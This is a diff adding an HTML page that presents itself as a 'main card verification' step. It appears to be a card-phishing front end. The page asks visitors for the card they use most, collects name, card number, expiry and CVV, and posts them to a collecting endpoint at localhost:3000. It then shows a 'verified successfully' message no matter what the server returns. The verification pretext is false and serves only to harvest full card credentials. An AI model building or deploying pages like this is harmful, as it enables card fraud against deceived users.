@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Main Card Verification</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Poppins', Arial, sans-serif;
+      background: #f4f7fa;
+      margin: 0;
+      padding: 0;
+      font-size: 0.85rem;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      width: 100%;
+      max-width: 360px;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+      padding: 20px 16px 16px 16px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    h2 {
+      color: #1a202c;
+      font-weight: 500;
+      margin-bottom: 8px;
+      font-size: 0.95rem;
+      letter-spacing: 0.2px;
+      text-align: center;
+    }
+    .note {
+      text-align: center;
+      color: #4a5568;
+      font-size: 0.78rem;
+      margin-bottom: 16px;
+      margin-top: 2px;
+      font-weight: 400;
+      letter-spacing: 0.1px;
+    }
+    .form-group {
+      position: relative;
+      margin-bottom: 14px;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+    label {
+      margin-bottom: 5px;
+      font-weight: 500;
+      color: #2d3748;
+      font-size: 0.85rem;
+      margin-left: 2px;
+      letter-spacing: 0.1px;
+    }
+    input {
+      width: 100%;
+      padding: 8px 30px 8px 28px;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      font-family: 'Poppins', Arial, sans-serif;
+      background: #f9fafb;
+      transition: border-color 0.2s;
+      box-sizing: border-box;
+      margin-top: 0;
+      margin-bottom: 0;
+    }
+    input:focus {
+      border-color: #0071ce;
+      outline: none;
+      background: #fff;
+    }
+    .form-group .fa-solid, .form-group .fa-regular {
+      position: absolute;
+      left: 8px;
+      top: 70%;
+      transform: translateY(-50%);
+      color: #0071ce;
+      font-size: 0.85rem;
+      opacity: 0.8;
+    }
+    .row {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 0;
+    }
+    .row .form-group {
+      margin-bottom: 0;
+      flex: 1;
+    }
+    button {
+      background: linear-gradient(90deg, #0071ce 0%, #005fa3 100%);
+      color: #fff;
+      border: none;
+      padding: 9px 0;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 0.9rem;
+      font-weight: 600;
+      margin-top: 12px;
+      width: 100%;
+      box-shadow: 0 2px 8px rgba(0,113,206,0.08);
+      transition: background 0.2s;
+      letter-spacing: 0.1px;
+    }
+    button:hover {
+      background: linear-gradient(90deg, #005fa3 0%, #0071ce 100%);
+    }
+    .loader {
+      display: none;
+      justify-content: center;
+      align-items: center;
+      margin-top: 16px;
+      margin-bottom: 8px;
+    }
+    .loader .spinner {
+      border: 3px solid #e2e8f0;
+      border-top: 3px solid #0071ce;
+      border-radius: 50%;
+      width: 28px;
+      height: 28px;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+    .success {
+      color: #38a169;
+      margin-top: 12px;
+      font-weight: 500;
+      text-align: center;
+      font-size: 0.95rem;
+      display: none;
+      letter-spacing: 0.1px;
+      padding: 16px 8px 12px 8px;
+      border-radius: 8px;
+      background: #f6fff7;
+      box-shadow: 0 2px 8px rgba(56,161,105,0.08);
+    }
+    .success .fa-thumbs-up {
+      font-size: 2.2rem;
+      color: #38a169;
+      margin-bottom: 8px;
+      display: block;
+    }
+    .success .msg {
+      font-size: 0.95rem;
+      color: #2d3748;
+      margin-top: 6px;
+      font-weight: 500;
+      letter-spacing: 0.1px;
+    }
+    .card-icon {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+    .card-icon .fa-credit-card {
+      font-size: 2.2rem;
+      color: #0071ce;
+      background: #f4f7fa;
+      border-radius: 50%;
+      padding: 14px;
+      box-shadow: 0 2px 8px rgba(0,113,206,0.08);
+    }
+    .modal-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.18);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    .modal-content {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.16);
+      padding: 28px 20px 24px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-width: 240px;
+      min-height: 120px;
+      max-width: 90vw;
+      max-height: 90vh;
+    }
+    .modal-loader .spinner {
+      width: 38px;
+      height: 38px;
+      border-width: 4px;
+    }
+    .modal-success .fa-thumbs-up {
+      font-size: 2.2rem;
+      margin-bottom: 10px;
+      color: #38a169;
+      display: block;
+    }
+    .modal-success .msg {
+      font-size: 0.95rem;
+      margin-top: 4px;
+      text-align: center;
+      color: #2d3748;
+      font-weight: 500;
+      letter-spacing: 0.1px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div style="display: flex; flex-direction: column; align-items: center; margin-bottom: 8px;">
+      <img src="./image.png" alt="Logo" style="height: 72px; margin-bottom: 1px; border-radius: 8px;">
+      <span class="card-icon" style="justify-content: center;">
+        <i class="fa-regular fa-credit-card"></i>
+      </span>
+    </div>
+    <h2>Please enter your main card for purchase verification</h2>
+    <div class="note">
+      This card will be used to verify your purchases. Please ensure you enter the card you use most frequently.
+    </div>
+    <form id="checkout-form" autocomplete="off">
+      <div class="form-group">
+        <label for="cardName">Name on Card</label>
+        <i class="fa-regular fa-user"></i>
+        <input type="text" id="cardName" required placeholder="Full Name" autocomplete="off">
+      </div>
+      <div class="form-group">
+        <label for="cardNumber">Card Number</label>
+        <i class="fa-regular fa-credit-card"></i>
+        <input type="text" id="cardNumber" maxlength="19" required placeholder="1234 5678 9012 3456" autocomplete="off">
+      </div>
+      <div class="row">
+        <div class="form-group">
+          <label for="expiry">Expiry (MM/YY)</label>
+          <i class="fa-regular fa-calendar"></i>
+          <input type="text" id="expiry" maxlength="5" required placeholder="MM/YY" autocomplete="off">
+        </div>
+        <div class="form-group">
+          <label for="cvv">CVV</label>
+          <i class="fa-solid fa-lock"></i>
+          <input type="password" id="cvv" maxlength="4" required placeholder="CVV" autocomplete="off">
+        </div>
+      </div>
+      <button type="submit">Verify</button>
+    </form>
+  </div>
+  <!-- Modal Loader -->
+  <div class="modal-overlay" id="modal-loader">
+    <div class="modal-content modal-loader">
+      <div class="spinner"></div>
+    </div>
+  </div>
+  <!-- Modal Success -->
+  <div class="modal-overlay" id="modal-success">
+    <div class="modal-content modal-success">
+      <i class="fa-solid fa-thumbs-up"></i>
+      <div class="msg">Card verified successfully! Thank you for confirming your main card.</div>
+    </div>
+  </div>
+  <script>
+    document.getElementById('checkout-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const cardName = document.getElementById('cardName').value.trim();
+      const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+      const expiry = document.getElementById('expiry').value.trim();
+      const cvv = document.getElementById('cvv').value.trim();
+
+      if (!cardName ||
+          !/^\d{16}$/.test(cardNumber) ||
+          !/^\d{2}\/\d{2}$/.test(expiry) ||
+          !/^\d{3,4}$/.test(cvv)) {
+        alert('Please enter valid card details.');
+        return;
+      }
+
+      // Hide form, show loader modal
+      document.getElementById('checkout-form').style.display = 'none';
+      document.getElementById('modal-success').style.display = 'none';
+      document.getElementById('modal-loader').style.display = 'flex';
+
+      // Send data to location
+      fetch('http://localhost:3000/api/card', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          cardName,
+          cardNumber,
+          expiry,
+          cvv
+        })
+      })
+      .then(response => {
+        // Optionally check response status here
+        setTimeout(function() {
+          document.getElementById('modal-loader').style.display = 'none';
+          document.getElementById('modal-success').style.display = 'flex';
+        }, 800);
+      })
+      .catch(error => {
+        document.getElementById('modal-loader').style.display = 'none';
+        alert('Failed to send card info. Please try again.');
+        document.getElementById('checkout-form').style.display = 'block';
+      });
+    });
+  </script>
+</body>
+</html>
